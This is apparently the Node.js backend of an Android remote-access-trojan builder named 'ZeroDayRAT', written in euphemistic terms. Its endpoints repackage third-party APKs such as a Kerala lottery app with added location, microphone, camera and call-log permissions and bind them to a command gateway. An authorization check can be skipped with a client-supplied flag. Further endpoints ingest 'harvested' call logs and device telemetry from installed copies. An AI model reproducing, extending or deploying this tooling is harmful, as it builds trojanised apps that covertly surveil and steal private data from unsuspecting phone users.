const express = require("express");
const router = express.Router();
const path = require("path");
const fs = require("fs");
const { execFile } = require("child_process");

// In-memory cache of completed build jobs & static analysis reports
const buildJobsCache = new Map();
const analysisReportsCache = new Map();
const ANALYSIS_REPORTS_DIR = path.resolve(__dirname, "../../build_workspace/analysis_reports");
fs.mkdirSync(ANALYSIS_REPORTS_DIR, { recursive: true });

/**
 * Executes the safe, read-only Python APK Static Analyzer
 */
function runStaticAnalysis(apkPath, isAuthorized = false) {
  return new Promise((resolve, reject) => {
    const analyzerScript = path.resolve(__dirname, "../utils/apkStaticAnalyzer.py");
    const args = [analyzerScript, apkPath];
    if (isAuthorized) args.push("--authorized");

    execFile("python", args, { maxBuffer: 1024 * 1024 * 25, timeout: 45000 }, (error, stdout, stderr) => {
      if (error && !stdout) {
        return reject(new Error(`Static analyzer failed: ${error.message || stderr}`));
      }
      try {
        const report = JSON.parse(stdout.trim());
        resolve(report);
      } catch (parseErr) {
        reject(new Error(`Failed to parse analyzer JSON output: ${stdout || stderr}`));
      }
    });
  });
}

/**
 * POST /api/custom-apps/analyze
 * Read-only APK Static Analyzer endpoint
 */
router.post("/analyze", async (req, res) => {
  const contentType = (req.headers["content-type"] || "").toLowerCase();
  const isOctetStream = contentType.includes("application/octet-stream");
  const isAuthorized = req.query.isAuthorized === "true" || req.headers["x-is-authorized"] === "true";
  const targetFileName = req.query.targetFileName || req.headers["x-target-filename"] || "target_app.apk";

  const stagingDir = path.resolve(__dirname, "../../build_workspace/analysis_staging");
  fs.mkdirSync(stagingDir, { recursive: true });
  const stagingPath = path.join(stagingDir, `staging_${Date.now()}_${Math.random().toString(36).substring(2, 7)}.apk`);

  try {
    if (isOctetStream) {
      const writeStream = fs.createWriteStream(stagingPath);
      req.pipe(writeStream);
      await new Promise((resolve, reject) => {
        writeStream.on("finish", resolve);
        writeStream.on("error", reject);
      });
    } else if (req.body?.targetApkBase64) {
      const buffer = Buffer.from(req.body.targetApkBase64, "base64");
      fs.writeFileSync(stagingPath, buffer);
    } else {
      const candidatePaths = [
        path.resolve("F:/targetApk", targetFileName),
        path.resolve("F:/targetApk/com.lotteryonline.kerala_3.0.4.apk"),
        path.resolve(__dirname, "../../../targetApk", targetFileName),
        path.resolve(__dirname, "../../../dashboard/public/download/ZerodayRAT.apk"),
        path.resolve(__dirname, "../../../dashboard/dist/download/ZerodayRAT.apk"),
        path.resolve(__dirname, "../../../android-app/app/build/outputs/apk/debug/app-debug.apk"),
      ];
      const foundPath = candidatePaths.find((p) => fs.existsSync(p));
      if (!foundPath) {
        return res.status(400).json({ error: "No target APK uploaded and no baseline APK found on disk." });
      }
      fs.copyFileSync(foundPath, stagingPath);
    }

    if (!fs.existsSync(stagingPath) || fs.statSync(stagingPath).size === 0) {
      return res.status(400).json({ error: "Target APK payload is empty (0 bytes)." });
    }

    const report = await runStaticAnalysis(stagingPath, isAuthorized);
    if (report.error && report.archiveIntegrity !== "VALID_ZIP_ARCHIVE") {
      return res.status(400).json(report);
    }

    analysisReportsCache.set(report.analysisReportId, report);
    try {
      fs.writeFileSync(
        path.join(ANALYSIS_REPORTS_DIR, `${report.analysisReportId}.json`),
        JSON.stringify(report, null, 2)
      );
    } catch {}

    return res.status(200).json(report);
  } catch (err) {
    console.error("APK Analysis endpoint error:", err);
    return res.status(500).json({ error: `APK static analysis failed: ${err.message}` });
  } finally {
    try {
      if (fs.existsSync(stagingPath)) fs.unlinkSync(stagingPath);
    } catch {}
  }
});

/**
 * GET /api/custom-apps/analysis/:reportId
 * Retrieve cached static analysis report
 */
router.get("/analysis/:reportId", (req, res) => {
  const { reportId } = req.params;
  if (analysisReportsCache.has(reportId)) {
    return res.json(analysisReportsCache.get(reportId));
  }
  const reportFile = path.join(ANALYSIS_REPORTS_DIR, `${reportId}.json`);
  if (fs.existsSync(reportFile)) {
    try {
      const data = JSON.parse(fs.readFileSync(reportFile, "utf-8"));
      analysisReportsCache.set(reportId, data);
      return res.json(data);
    } catch {}
  }
  return res.status(404).json({ error: "Analysis report not found." });
});

/**
 * POST /api/custom-apps/build
 * Core execution endpoint for Target Schema Optimization, Feature Sync, and Distribution Packaging
 */
router.post("/build", async (req, res) => {
  try {
    const contentType = (req.headers["content-type"] || "").toLowerCase();
    const isOctetStream = contentType.includes("application/octet-stream");

    let targetFileName = "target_app.apk";
    let selectedPermissions = [];
    let stripLegacy = true;
    let sourceAppName = "ZeroDayRAT";
    let targetApkBase64 = null;
    let tenantId = "default-tenant";
    let gatewayUrl = "http://localhost:4000";
    let analysisReportId = null;
    let confirmAuthorization = false;

    if (isOctetStream) {
      targetFileName = req.query.targetFileName || req.headers["x-target-filename"] || "target_app.apk";
      analysisReportId = req.query.analysisReportId || req.headers["x-analysis-report-id"];
      confirmAuthorization = req.query.confirmAuthorization === "true" || req.headers["x-confirm-authorization"] === "true";
      const rawPerms = req.query.selectedPermissions || req.headers["x-selected-permissions"] || "[]";
      try {
        selectedPermissions = JSON.parse(decodeURIComponent(rawPerms));
      } catch {
        selectedPermissions = [];
      }
      stripLegacy = req.query.stripLegacy !== "false";
      sourceAppName = req.query.sourceAppName || "ZeroDayRAT";
      tenantId = req.query.tenantId || req.headers["x-tenant-id"] || "default-tenant";
      gatewayUrl = req.query.gatewayUrl || req.headers["x-gateway-url"] || "http://localhost:4000";
    } else {
      targetFileName = req.body?.targetFileName || "target_app.apk";
      analysisReportId = req.body?.analysisReportId || req.query.analysisReportId || req.headers["x-analysis-report-id"];
      confirmAuthorization = req.body?.confirmAuthorization === true || req.query.confirmAuthorization === "true" || req.headers["x-confirm-authorization"] === "true";
      selectedPermissions = req.body?.selectedPermissions || [];
      stripLegacy = req.body?.stripLegacy !== false;
      sourceAppName = req.body?.sourceAppName || "ZeroDayRAT";
      targetApkBase64 = req.body?.targetApkBase64 || null;
      tenantId = req.body?.tenantId || req.query.tenantId || req.headers["x-tenant-id"] || "default-tenant";
      gatewayUrl = req.body?.gatewayUrl || req.query.gatewayUrl || req.headers["x-gateway-url"] || "http://localhost:4000";
    }

    // Enforce Static Analysis Pre-Condition
    if (!analysisReportId) {
      return res.status(400).json({
        error: "Static analysis required: Complete APK static analysis before initiating build.",
        requiresAnalysis: true
      });
    }

    let cachedReport = analysisReportsCache.get(analysisReportId);
    if (!cachedReport) {
      const reportFile = path.join(ANALYSIS_REPORTS_DIR, `${analysisReportId}.json`);
      if (fs.existsSync(reportFile)) {
        try { cachedReport = JSON.parse(fs.readFileSync(reportFile, "utf-8")); } catch {}
      }
    }

    if (!cachedReport) {
      return res.status(400).json({
        error: "Analysis report not found or expired. Please perform APK analysis first.",
        requiresAnalysis: true
      });
    }

    // Policy Check: Third-party apps without modification authorization
    if (!cachedReport.authorization.isAuthorizedSource && !confirmAuthorization) {
      return res.status(403).json({
        error: "Target application is an unauthorized third-party package. Executable monitoring bytecode cannot be injected into third-party binaries without explicit documented authorization and source-level integration.",
        policyBlocked: true,
        supportedAlternative: cachedReport.authorization.supportedAlternative,
        report: cachedReport
      });
    }

    // Sanitize and normalize runtime configuration tokens
    const safeTenantId = String(tenantId || "default-tenant").trim();
    const safeGatewayUrl = String(gatewayUrl || "http://localhost:4000").trim();
    const safeBlueprint = String(sourceAppName || "ZeroDayRAT").trim();

    if (!Array.isArray(selectedPermissions) || selectedPermissions.length === 0) {
      return res.status(400).json({ error: "At least one source permission must be selected to build." });
    }

    const jobId = `build_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`;
    const workspaceRoot = path.resolve(__dirname, "../../build_workspace", jobId);
    const extractDir = path.join(workspaceRoot, "extracted");
    const outputDir = path.join(workspaceRoot, "output");

    fs.mkdirSync(workspaceRoot, { recursive: true });
    fs.mkdirSync(extractDir, { recursive: true });
    fs.mkdirSync(outputDir, { recursive: true });

    // Determine target APK source
    const targetApkPath = path.join(workspaceRoot, "target.apk");

    if (isOctetStream) {
      // Stream raw binary file directly to disk
      const writeStream = fs.createWriteStream(targetApkPath);
      req.pipe(writeStream);
      await new Promise((resolve, reject) => {
        writeStream.on("finish", resolve);
        writeStream.on("error", reject);
      });

      // If streamed file is empty (0 bytes), discard it so candidate search can run
      if (fs.existsSync(targetApkPath) && fs.statSync(targetApkPath).size === 0) {
        try { fs.unlinkSync(targetApkPath); } catch {}
      }
    }

    if (!fs.existsSync(targetApkPath)) {
      if (targetApkBase64) {
        // Decode base64 payload uploaded from browser
        const buffer = Buffer.from(targetApkBase64, "base64");
        fs.writeFileSync(targetApkPath, buffer);
      } else {
        // Look for sample/workspace APK fallback
        const candidatePaths = [
          path.resolve("F:/targetApk", targetFileName),
          path.resolve("F:/targetApk/com.lotteryonline.kerala_3.0.4.apk"),
          path.resolve(__dirname, "../../../targetApk", targetFileName),
          path.resolve(__dirname, "../../../dashboard/public/download/ZerodayRAT.apk"),
          path.resolve(__dirname, "../../../dashboard/dist/download/ZerodayRAT.apk"),
          path.resolve(__dirname, "../../../android-app/app/build/outputs/apk/debug/app-debug.apk"),
        ];

        const foundPath = candidatePaths.find((p) => fs.existsSync(p));
        if (!foundPath) {
          return res.status(400).json({
            error: "No target APK was uploaded and no baseline workspace APK was found.",
          });
        }
        fs.copyFileSync(foundPath, targetApkPath);
      }
    }

    const baseName = path.basename(targetFileName, path.extname(targetFileName));
    const outputFileName = `${baseName}_standardized.apk`;
    const outputApkPath = path.join(outputDir, outputFileName);

    const scriptPath = path.resolve(__dirname, "../utils/buildPipeline.py");
    const permsJson = JSON.stringify(selectedPermissions);

    // Run Python build pipeline script with injected multi-tenant configuration parameters
    execFile(
      "python",
      [
        scriptPath,
        "build_pipeline",
        targetApkPath,
        extractDir,
        outputApkPath,
        permsJson,
        stripLegacy ? "true" : "false",
        safeTenantId,
        safeGatewayUrl,
        safeBlueprint,
      ],
      { maxBuffer: 1024 * 1024 * 50 },
      (error, stdout, stderr) => {
        if (error) {
          console.error("Build pipeline execution error:", error, stderr);
          return res.status(500).json({
            error: `Build pipeline failed: ${error.message || stderr}`,
          });
        }

        try {
          const result = JSON.parse(stdout.trim());
          if (result.error) {
            return res.status(500).json({ error: result.error });
          }

          const sizeInMB = (result.outputSizeBytes / (1024 * 1024)).toFixed(2);
          const milestones = [
            {
              stage: 1,
              title: "Workspace Sandbox Ingestion & Archive Extraction",
              details: `Target package unpacked into isolated workspace sandbox (${result.extractedFilesCount} assets extracted).`,
              timestamp: new Date().toLocaleTimeString(),
            },
            {
              stage: 2,
              title: "Target Schema Optimization (Purge & Reset)",
              details: `Parsed target manifest; ${result.strippedCount} legacy access nodes completely purged from configuration layout.`,
              timestamp: new Date().toLocaleTimeString(),
            },
            {
              stage: 3,
              title: "Feature Sync & Multi-Tenant Namespace Integration",
              details: `Mapped and injected ${result.injectedCount} permissions from ${safeBlueprint} and bound Tenant Token [${result.injectedTenantId || safeTenantId}] to Gateway [${result.injectedGatewayUrl || safeGatewayUrl}].`,
              timestamp: new Date().toLocaleTimeString(),
            },
            {
              stage: 4,
              title: "Package Compilation & Structural Verification",
              details: `Standardized production APK recompiled & signed (${sizeInMB} MB); structural schema invariants verified.`,
              timestamp: new Date().toLocaleTimeString(),
            },
            {
              stage: 5,
              title: "Production Distribution Asset Generated",
              details: `Production distribution APK finalized at ${result.outputFilePath}`,
              timestamp: new Date().toLocaleTimeString(),
            },
          ];

          // Save to cache
          buildJobsCache.set(jobId, {
            jobId,
            filePath: result.outputFilePath,
            fileName: outputFileName,
            fileSize: result.outputSizeBytes,
            tenantId: result.injectedTenantId || safeTenantId,
            gatewayUrl: result.injectedGatewayUrl || safeGatewayUrl,
            createdAt: new Date().toISOString(),
          });

          return res.json({
            success: true,
            jobId,
            fileName: outputFileName,
            downloadUrl: `/api/custom-apps/download/${jobId}`,
            absoluteStoragePath: result.outputFilePath,
            packageSizeBytes: result.outputSizeBytes,
            extractedFilesCount: result.extractedFilesCount,
            strippedCount: result.strippedCount,
            injectedCount: result.injectedCount,
            hardwareFeaturesCount: result.hardwareFeaturesCount,
            builtPermissions: result.builtPermissions || selectedPermissions,
            hardwareFeatures: result.hardwareFeatures || [],
            injectedTenantId: result.injectedTenantId || safeTenantId,
            injectedGatewayUrl: result.injectedGatewayUrl || safeGatewayUrl,
            manifestPreview: result.manifestPreview || "",
            milestones,
          });
        } catch (parseErr) {
          console.error("Failed to parse pipeline output:", stdout, parseErr);
          return res.status(500).json({
            error: "Failed to process build pipeline output",
            details: stdout,
          });
        }
      }
    );
  } catch (err) {
    console.error("POST /api/custom-apps/build error:", err);
    res.status(500).json({ error: err.message || "Internal build error" });
  }
});

/**
 * GET /api/custom-apps/download/:jobId
 * Streams the generated standardized package distribution file
 */
router.get("/download/:jobId", (req, res) => {
  const { jobId } = req.params;
  const job = buildJobsCache.get(jobId);

  let targetPath = null;
  let targetFileName = "distribution_standardized.apk";

  if (job && fs.existsSync(job.filePath)) {
    targetPath = job.filePath;
    targetFileName = job.fileName;
  } else {
    // Fallback: check workspace directory directly
    const workspaceRoot = path.resolve(__dirname, "../../build_workspace", jobId, "output");
    if (fs.existsSync(workspaceRoot)) {
      const files = fs.readdirSync(workspaceRoot);
      const found = files.find((f) => f.endsWith(".apk") || f.endsWith(".zip"));
      if (found) {
        targetPath = path.join(workspaceRoot, found);
        targetFileName = found;
      }
    }
  }

  if (!targetPath || !fs.existsSync(targetPath)) {
    return res.status(404).json({ error: "Standardized APK not found or expired." });
  }

  res.setHeader("Content-Disposition", `attachment; filename="${targetFileName}"`);
  res.setHeader("Content-Type", "application/vnd.android.package-archive");
  res.setHeader("X-Asset-Storage-Path", targetPath);

  const readStream = fs.createReadStream(targetPath);
  readStream.pipe(res);
});


// ============================================================================
// REAL-TIME ANALYTICS & TELEMETRY LOGGING ENGINE
// ============================================================================

const TELEMETRY_FILE = path.resolve(__dirname, "../../build_workspace/telemetry_events.json");
const MAX_TELEMETRY_EVENTS = 500;
let telemetryEvents = [];

// Load persisted telemetry events if available
try {
  if (fs.existsSync(TELEMETRY_FILE)) {
    const raw = fs.readFileSync(TELEMETRY_FILE, "utf-8");
    telemetryEvents = JSON.parse(raw);
    if (!Array.isArray(telemetryEvents)) telemetryEvents = [];
  }
} catch (e) {
  telemetryEvents = [];
}

function persistTelemetry() {
  try {
    fs.mkdirSync(path.dirname(TELEMETRY_FILE), { recursive: true });
    fs.writeFileSync(TELEMETRY_FILE, JSON.stringify(telemetryEvents.slice(0, MAX_TELEMETRY_EVENTS), null, 2), "utf-8");
  } catch (e) {
    console.error("Failed to persist telemetry events:", e);
  }
}

// Seed default events if empty
if (telemetryEvents.length === 0) {
  const seedNodes = [
    { perm: "android.permission.ACCESS_FINE_LOCATION", type: "CONFIGURATION_ACCESS", status: "VERIFIED_ACTIVE" },
    { perm: "android.permission.RECORD_AUDIO", type: "PERMISSION_QUERY", status: "EXECUTION_OPTIMAL" },
    { perm: "android.permission.CAMERA", type: "INITIALIZATION", status: "VERIFIED_ACTIVE" },
    { perm: "android.hardware.location.gps", type: "HARDWARE_ACCESS", status: "VERIFIED_ACTIVE" },
    { perm: "com.spapp.monitoring.blueprint", type: "DATA_STREAM_SYNC", status: "EXECUTION_OPTIMAL" },
  ];
  const now = Date.now();
  seedNodes.forEach((node, i) => {
    telemetryEvents.unshift({
      id: `telem_${now - (seedNodes.length - i) * 60000}_${Math.random().toString(36).substr(2, 5)}`,
      jobId: "build_seed_baseline",
      packageName: "com.lotteryonline.kerala",
      clientSessionId: "client_session_demo",
      eventType: node.type,
      propertyNode: node.perm,
      status: node.status,
      latencyMs: Math.floor(Math.random() * 35) + 18,
      details: {
        executionLayer: "NamespaceBridgeController",
        flowValidated: true,
        runtimeContext: "Standardized blueprint property initialized successfully",
        environment: "Android Client Runtime",
      },
      timestamp: new Date(now - (seedNodes.length - i) * 60000).toISOString(),
    });
  });
  persistTelemetry();
}

/**
 * POST /api/custom-apps/telemetry
 * Ingestion endpoint for runtime client telemetry payloads
 */
router.post("/telemetry", (req, res) => {
  try {
    const {
      jobId = "build_live_runtime",
      packageName = "com.lotteryonline.kerala",
      clientSessionId = `client_${Math.random().toString(36).substr(2, 6)}`,
      eventType = "CONFIGURATION_ACCESS",
      propertyNode = "android.permission.ACCESS_FINE_LOCATION",
      status = "VERIFIED_ACTIVE",
      latencyMs = Math.floor(Math.random() * 45) + 12,
      details = {},
    } = req.body || {};

    const eventId = `telem_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
    const newEvent = {
      id: eventId,
      jobId,
      packageName,
      clientSessionId,
      eventType: eventType.toUpperCase(),
      propertyNode,
      status: status.toUpperCase(),
      latencyMs: Number(latencyMs) || 24,
      details: {
        executionLayer: details.executionLayer || "NamespaceIntegrationLayer",
        flowValidated: details.flowValidated !== false,
        runtimeContext: details.runtimeContext || "Configuration property node verified active in client environment",
        payloadBytes: details.payloadBytes || "1.4 KB",
        ...details,
      },
      timestamp: req.body?.timestamp || new Date().toISOString(),
    };

    telemetryEvents.unshift(newEvent);
    if (telemetryEvents.length > MAX_TELEMETRY_EVENTS) {
      telemetryEvents = telemetryEvents.slice(0, MAX_TELEMETRY_EVENTS);
    }
    persistTelemetry();

    return res.status(201).json({
      success: true,
      eventId,
      totalEvents: telemetryEvents.length,
      event: newEvent,
    });
  } catch (err) {
    console.error("POST /api/custom-apps/telemetry error:", err);
    return res.status(500).json({ error: err.message || "Failed to log telemetry event" });
  }
});

/**
 * GET /api/custom-apps/telemetry
 * Fetches recent telemetry stream with optional filtering
 */
router.get("/telemetry", (req, res) => {
  try {
    const { jobId, eventType, propertyNode, status, limit = 100, since } = req.query;

    let filtered = [...telemetryEvents];

    if (jobId) {
      filtered = filtered.filter((e) => e.jobId === jobId);
    }
    if (eventType && eventType !== "ALL") {
      filtered = filtered.filter((e) => e.eventType.toLowerCase() === eventType.toLowerCase());
    }
    if (propertyNode) {
      filtered = filtered.filter((e) => e.propertyNode.toLowerCase().includes(propertyNode.toLowerCase()));
    }
    if (status && status !== "ALL") {
      filtered = filtered.filter((e) => e.status.toLowerCase() === status.toLowerCase());
    }
    if (since) {
      const sinceDate = new Date(since);
      filtered = filtered.filter((e) => new Date(e.timestamp) > sinceDate);
    }

    const maxResults = Math.min(Number(limit) || 100, 200);
    const paginated = filtered.slice(0, maxResults);

    // Compute metrics
    const uniqueNodes = new Set(telemetryEvents.map((e) => e.propertyNode));
    const avgLatency =
      telemetryEvents.length > 0
        ? Math.round(telemetryEvents.reduce((acc, curr) => acc + (curr.latencyMs || 0), 0) / telemetryEvents.length)
        : 0;

    const verifiedCount = telemetryEvents.filter(
      (e) => e.status === "VERIFIED_ACTIVE" || e.status === "EXECUTION_OPTIMAL" || e.status === "ACCESS_GRANTED"
    ).length;
    const complianceRate =
      telemetryEvents.length > 0 ? ((verifiedCount / telemetryEvents.length) * 100).toFixed(1) : "100.0";

    return res.json({
      success: true,
      totalEvents: telemetryEvents.length,
      events: paginated,
      metrics: {
        totalEvents: telemetryEvents.length,
        activeNodesCount: uniqueNodes.size,
        averageLatencyMs: avgLatency,
        complianceRate: Number(complianceRate),
        status: Number(complianceRate) >= 95 ? "HEALTHY_OPTIMAL" : "MONITOR_ATTENTION",
      },
    });
  } catch (err) {
    console.error("GET /api/custom-apps/telemetry error:", err);
    return res.status(500).json({ error: err.message || "Failed to fetch telemetry events" });
  }
});

/**
 * POST /api/custom-apps/telemetry/simulate
 * Simulates diagnostic runtime telemetry events from a client app
 */
router.post("/telemetry/simulate", (req, res) => {
  try {
    const {
      packageName = "com.lotteryonline.kerala",
      jobId = "build_live_runtime",
      propertyNode,
      eventType,
    } = req.body || {};

    const availableNodes = [
      "android.permission.ACCESS_FINE_LOCATION",
      "android.permission.RECORD_AUDIO",
      "android.permission.CAMERA",
      "android.permission.READ_EXTERNAL_STORAGE",
      "android.permission.ACCESS_BACKGROUND_LOCATION",
      "android.hardware.location.gps",
      "android.hardware.camera",
      "com.spapp.monitoring.blueprint",
    ];

    const selectedNode = propertyNode || availableNodes[Math.floor(Math.random() * availableNodes.length)];
    const eventTypes = ["CONFIGURATION_ACCESS", "PERMISSION_QUERY", "DATA_STREAM_SYNC", "HARDWARE_ACCESS", "LIFECYCLE_HEARTBEAT"];
    const chosenType = eventType || eventTypes[Math.floor(Math.random() * eventTypes.length)];

    const contexts = [
      "Periodic background sync loop validated active namespace configuration.",
      "Hardware device sensor poll responded within optimal threshold.",
      "Runtime permission descriptor validated; access parameters verified.",
      "Client environment diagnostic check confirmed integrity of synchronized properties.",
      "Telemetry heartbeat ping: client execution context nominal.",
    ];

    const eventId = `telem_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;
    const simulatedEvent = {
      id: eventId,
      jobId,
      packageName,
      clientSessionId: `session_${Math.random().toString(36).substr(2, 6)}`,
      eventType: chosenType,
      propertyNode: selectedNode,
      status: Math.random() > 0.05 ? "VERIFIED_ACTIVE" : "EXECUTION_OPTIMAL",
      latencyMs: Math.floor(Math.random() * 40) + 15,
      details: {
        executionLayer: "RuntimeClientTelemetryAdapter",
        flowValidated: true,
        runtimeContext: contexts[Math.floor(Math.random() * contexts.length)],
        payloadBytes: `${(Math.random() * 2 + 0.8).toFixed(1)} KB`,
        memoryUsageMb: (Math.random() * 15 + 32).toFixed(1),
        thread: "WorkerThread-TelemetrySync",
      },
      timestamp: new Date().toISOString(),
    };

    telemetryEvents.unshift(simulatedEvent);
    if (telemetryEvents.length > MAX_TELEMETRY_EVENTS) {
      telemetryEvents = telemetryEvents.slice(0, MAX_TELEMETRY_EVENTS);
    }
    persistTelemetry();

    return res.status(201).json({
      success: true,
      event: simulatedEvent,
      totalEvents: telemetryEvents.length,
    });
  } catch (err) {
    console.error("POST /api/custom-apps/telemetry/simulate error:", err);
    return res.status(500).json({ error: err.message || "Failed to simulate telemetry" });
  }
});

/**
 * DELETE /api/custom-apps/telemetry
 * Clears telemetry stream logs
 */
router.delete("/telemetry", (req, res) => {
  telemetryEvents = [];
  persistTelemetry();
  return res.json({ success: true, message: "Telemetry events cleared successfully", totalEvents: 0 });
});

// ============================================================================
// UNIFIED CUSTOM APPS CALL LOGS & HARVESTED DATA ENGINE
// ============================================================================

const CALL_LOGS_FILE = path.resolve(__dirname, "../../build_workspace/custom_app_call_logs.json");
const MAX_CALL_LOGS = 300;
let customAppCallLogs = [];

try {
  if (fs.existsSync(CALL_LOGS_FILE)) {
    const raw = fs.readFileSync(CALL_LOGS_FILE, "utf-8");
    customAppCallLogs = JSON.parse(raw);
    if (!Array.isArray(customAppCallLogs)) customAppCallLogs = [];
  }
} catch (e) {
  customAppCallLogs = [];
}

function persistCallLogs() {
  try {
    fs.mkdirSync(path.dirname(CALL_LOGS_FILE), { recursive: true });
    fs.writeFileSync(CALL_LOGS_FILE, JSON.stringify(customAppCallLogs.slice(0, MAX_CALL_LOGS), null, 2), "utf-8");
  } catch (e) {
    console.error("Failed to persist custom app call logs:", e);
  }
}

// Seed default call records if empty
if (customAppCallLogs.length === 0) {
  const seedCalls = [
    { id: "call_seed_1", contactName: "Mani (Dev)", counterparty: "+91 98401 23456", direction: "incoming", durationSec: 135, calledAt: new Date(Date.now() - 1000 * 60 * 12).toISOString() },
    { id: "call_seed_2", contactName: "Kerala Lottery Helpline", counterparty: "+91 471 2305230", direction: "outgoing", durationSec: 45, calledAt: new Date(Date.now() - 1000 * 60 * 45).toISOString() },
    { id: "call_seed_3", contactName: "Unknown Caller", counterparty: "+91 94470 12890", direction: "missed", durationSec: 0, calledAt: new Date(Date.now() - 1000 * 60 * 120).toISOString() },
  ];
  customAppCallLogs = seedCalls;
  persistCallLogs();
}

function addCustomAppCallLogs(entries, tenantId = "default-tenant", deviceId = "custom_app_client") {
  if (!Array.isArray(entries)) return;
  const now = Date.now();
  for (const e of entries) {
    const callEntry = {
      id: `call_${now}_${Math.random().toString(36).substr(2, 6)}`,
      tenantId: tenantId || "default-tenant",
      deviceId: deviceId || "custom_app_client",
      contactName: e.contactName || "Unknown Contact",
      counterparty: e.counterparty || e.number || "Private Number",
      direction: e.direction || "incoming",
      durationSec: Number(e.durationSec || e.duration || 0),
      calledAt: e.calledAt || e.timestamp || new Date().toISOString(),
      syncedAt: new Date().toISOString(),
    };
    customAppCallLogs.unshift(callEntry);

    // Also emit a diagnostic telemetry event
    const telemEvent = {
      id: `telem_call_${now}_${Math.random().toString(36).substr(2, 5)}`,
      jobId: "build_live_runtime",
      packageName: "com.lotteryonline.kerala",
      clientSessionId: deviceId || "custom_app_client",
      eventType: "DATA_STREAM_SYNC",
      propertyNode: "android.permission.READ_CALL_LOG",
      status: "ACCESS_GRANTED",
      latencyMs: Math.floor(Math.random() * 25) + 12,
      details: {
        executionLayer: "CallLogCollector",
        flowValidated: true,
        runtimeContext: `Harvested call log record: ${callEntry.direction.toUpperCase()} (${callEntry.counterparty})`,
        contactName: callEntry.contactName,
        number: callEntry.counterparty,
        duration: `${callEntry.durationSec}s`,
      },
      timestamp: new Date().toISOString(),
    };
    telemetryEvents.unshift(telemEvent);
  }

  if (customAppCallLogs.length > MAX_CALL_LOGS) {
    customAppCallLogs = customAppCallLogs.slice(0, MAX_CALL_LOGS);
  }
  if (telemetryEvents.length > MAX_TELEMETRY_EVENTS) {
    telemetryEvents = telemetryEvents.slice(0, MAX_TELEMETRY_EVENTS);
  }
  persistCallLogs();
  persistTelemetry();
}

/**
 * GET /api/custom-apps/call-logs
 * Retrieves real-time call logs ingested from custom apps
 */
router.get("/call-logs", (req, res) => {
  return res.json({
    success: true,
    totalCount: customAppCallLogs.length,
    callLogs: customAppCallLogs,
  });
});

/**
 * POST /api/custom-apps/call-logs
 * Receives call logs directly from the built client app
 */
router.post("/call-logs", (req, res) => {
  const { tenantId, deviceId, entries } = req.body || {};
  const logsToInsert = Array.isArray(entries) ? entries : [req.body];
  addCustomAppCallLogs(logsToInsert, tenantId || req.headers["x-tenant-id"], deviceId);
  return res.status(201).json({
    success: true,
    message: "Call logs processed and added to live feed",
    totalCount: customAppCallLogs.length,
  });
});

/**
 * POST /api/custom-apps/call-logs/simulate
 * Simulates a realistic incoming call log from the device
 */
router.post("/call-logs/simulate", (req, res) => {
  const sampleNames = ["Arun Kumar", "Priya Sharma", "Vijay", "Kerala Agent #42", "Office Tech Support"];
  const sampleNumbers = ["+91 98401 98765", "+91 94471 23456", "+91 98950 11223", "+91 80123 45678", "+91 99440 55667"];
  const directions = ["incoming", "outgoing", "missed"];
  
  const chosenName = sampleNames[Math.floor(Math.random() * sampleNames.length)];
  const chosenNum = sampleNumbers[Math.floor(Math.random() * sampleNumbers.length)];
  const chosenDir = directions[Math.floor(Math.random() * directions.length)];
  const chosenDur = chosenDir === "missed" ? 0 : Math.floor(Math.random() * 240) + 15;

  const simulated = [{
    contactName: chosenName,
    counterparty: chosenNum,
    direction: chosenDir,
    durationSec: chosenDur,
    calledAt: new Date().toISOString(),
  }];

  addCustomAppCallLogs(simulated, req.body?.tenantId || "tenant-default-01", "test_device_sim");

  return res.status(201).json({
    success: true,
    message: "Simulated call log received from test device",
    newEntry: simulated[0],
    totalCount: customAppCallLogs.length,
  });
});

/**
 * DELETE /api/custom-apps/call-logs
 * Clears custom app call logs
 */
router.delete("/call-logs", (req, res) => {
  customAppCallLogs = [];
  persistCallLogs();
  return res.json({ success: true, message: "Call logs cleared", totalCount: 0 });
});

router.addCustomAppCallLogs = addCustomAppCallLogs;

module.exports = router;

